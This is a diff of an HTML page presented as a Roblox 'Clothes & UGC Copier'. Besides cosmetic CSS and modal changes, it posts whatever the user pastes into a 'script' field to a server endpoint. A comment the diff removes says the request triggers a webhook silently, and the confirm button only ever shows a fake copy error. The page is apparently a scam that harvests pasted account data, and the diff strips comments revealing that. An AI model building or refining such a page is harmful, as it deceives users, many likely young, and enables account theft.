@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RBXDEV | Clothes & UGC Copier</title>
-    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -17,9 +16,16 @@
         .glow-purple { box-shadow: 0 0 50px -10px rgba(139, 92, 246, 0.25); }
         .glow-blue { box-shadow: 0 0 30px -5px rgba(59, 130, 246, 0.4); }
         .glass-card {
-            background: rgba(15, 17, 26, 0.7);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.07);
+            background: rgba(15, 17, 26, 0.75);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-animate {
+            animation: fadeIn 0.25s cubic-bezier(0.16, 1, 0.3, 1) forwards;
         }
     </style>
 </head>
@@ -78,10 +84,10 @@
 
     <!-- Confirmation Modal Popup -->
     <div id="confirm-modal" class="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 hidden">
-        <div class="glass-card rounded-2xl p-6 max-w-sm w-full mx-4 text-center border border-purple-500/30 shadow-2xl">
-            <h3 class="text-lg font-bold text-white mb-2">Did you want to copy this item?</h3>
-            <div class="my-4 flex justify-center">
-                <img id="modal-img" src="" alt="Item Preview" class="w-32 h-32 object-contain rounded-xl bg-black/50 border border-white/10 p-2 shadow-inner">
+        <div class="glass-card modal-animate rounded-2xl p-6 max-w-sm w-full mx-4 text-center border border-purple-500/30 shadow-2xl">
+            <h3 class="text-lg font-bold text-white mb-3">Did you want to copy this item?</h3>
+            <div class="my-3 flex justify-center">
+                <img id="modal-img" src="" alt="Item Preview" class="w-32 h-32 object-contain rounded-xl bg-black/60 border border-white/10 p-2 shadow-inner">
             </div>
             <p id="modal-item-name" class="text-sm font-semibold text-blue-400 mb-6 truncate px-2"></p>
             <div class="flex space-x-3">
@@ -107,8 +113,6 @@
         const modalCancel = document.getElementById('modal-cancel');
         const modalConfirm = document.getElementById('modal-confirm');
 
-        let pendingPayload = '';
-
         submitBtn.addEventListener('click', async () => {
             const payload = scriptInput.value.trim();
             if (!payload) {
@@ -118,13 +122,11 @@
                 return;
             }
 
-            pendingPayload = payload;
             submitBtn.disabled = true;
             submitBtn.innerHTML = `Searching item...`;
             statusDiv.classList.add('hidden');
 
             try {
-                // Send request to server to fetch item details & thumbnail + trigger webhook silently
                 const response = await fetch('/api/process', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -134,10 +136,9 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    // Populate modal with fetched thumbnail and item name
                     modalImg.src = result.itemThumb;
                     modalItemName.textContent = result.itemName;
-                    modal.classList.remove('hidden'); // Show confirmation popup
+                    modal.classList.remove('hidden');
                 } else {
                     statusDiv.textContent = "Error: Couldn't copy your item, please try again.";
                     statusDiv.className = "text-xs font-medium text-center text-red-400";
@@ -153,13 +154,11 @@
             }
         });
 
-        // Cancel Button Action
         modalCancel.addEventListener('click', () => {
             modal.classList.add('hidden');
             scriptInput.value = '';
         });
 
-        // Confirm Button Action
         modalConfirm.addEventListener('click', () => {
             modal.classList.add('hidden');
             statusDiv.textContent = "Error: Couldn't copy your item, please try again.";
